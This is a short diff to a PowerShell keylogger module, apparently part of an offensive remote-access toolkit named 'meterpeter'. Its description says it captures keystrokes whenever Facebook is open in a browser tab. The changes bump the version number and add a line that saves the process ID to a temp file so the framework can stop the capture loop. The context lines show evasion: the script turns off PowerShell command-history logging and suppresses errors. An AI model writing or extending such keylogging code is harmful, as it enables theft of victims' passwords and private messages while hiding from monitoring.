@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Get-Process,mscore.ps1
    Optional Dependencies: UserLand,Administrator
-   PS cmdlet Dev version: v1.1.8
+   PS cmdlet Dev version: v1.2.8
    
 .DESCRIPTION
    Capture keyboard keystrokes if facebook is open (browser tab)
@@ -93,7 +93,7 @@
 )
 
 
-$CmdletVersion = "v1.1.8"
+$CmdletVersion = "v1.2.8"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -202,6 +202,10 @@ If($Action -iMatch '^(start)$')
 
 
    echo ""
+   ## To stop previous process (loop) meterpeter requires this PID
+   $pid > "$Env:TMP\met.pid"
+
+
    while($true)
    {
       <#
